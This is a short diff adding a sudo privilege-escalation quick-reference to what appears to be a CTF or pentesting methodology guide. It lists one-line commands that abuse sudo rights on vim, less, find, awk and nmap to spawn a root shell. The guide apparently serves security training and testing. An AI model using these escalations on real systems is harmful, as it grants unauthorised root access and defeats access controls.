@@ -94,6 +94,16 @@ ip addr && ip route && ss -tulpn
 Core Linux privesc methodology. Start with automated enumeration, then work through
 manual techniques.
 
+**Sudo GTFOBins quick-reference** (top-5 CTF patterns, inline):
+```
+sudo vim        -> :!bash  (or :set shell=/bin/bash :shell)
+sudo less       -> !bash
+sudo find       -> sudo find / -name x -exec /bin/bash \;
+sudo awk        -> sudo awk 'BEGIN {system("/bin/bash")}'
+sudo nmap       -> sudo nmap --interactive  (then !sh)  [older nmap only]
+```
+Run `sudo -l` first - if any of these appear, escalation is one command away.
+
 Read `references/linux-privesc.md` for the full technique library
 covering:
 
